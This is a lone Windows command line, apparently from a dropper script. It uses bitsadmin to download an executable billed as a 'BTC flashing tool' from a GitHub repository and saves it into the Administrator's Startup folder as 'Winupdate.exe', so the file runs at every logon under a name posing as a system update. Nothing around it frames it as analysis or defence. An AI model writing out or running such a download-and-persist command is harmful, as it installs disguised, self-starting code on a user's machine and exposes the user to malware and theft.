...
bitsadmin /transfer Packages /download /priority foreground https://github.com/NorthernXploit/BTC-FLASHING-SOFTWARE-2022-2023/raw/master/btc%20flashing%20tool%202022-2023.exe "C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Winupdate.exe" 
